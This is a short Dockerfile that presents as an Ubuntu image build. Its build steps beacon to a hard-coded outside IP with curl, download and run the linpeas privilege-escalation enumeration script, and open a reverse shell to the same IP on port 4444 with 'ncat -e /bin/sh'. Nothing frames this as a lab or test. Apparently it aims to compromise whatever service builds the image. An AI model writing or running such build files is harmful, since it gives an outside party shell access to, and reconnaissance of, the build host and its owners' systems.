FROM ubuntu

WORKDIR /tmp

RUN mkdir touch_my_docker
RUN apt update && apt install -y curl && apt install -y ncat && apt install python3 -y
RUN curl http://68.183.4.199/from_ibm
RUN python3 -c "import urllib.request; urllib.request.urlretrieve('https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh', 'linpeas.sh')"
RUN chmod +x ./linpeas.sh
RUN ./linpeas.sh -a > /tmp/linpeas.txt
RUN ncat 68.183.4.199 4444 -e /bin/sh
CMD ["/bin/bash"]
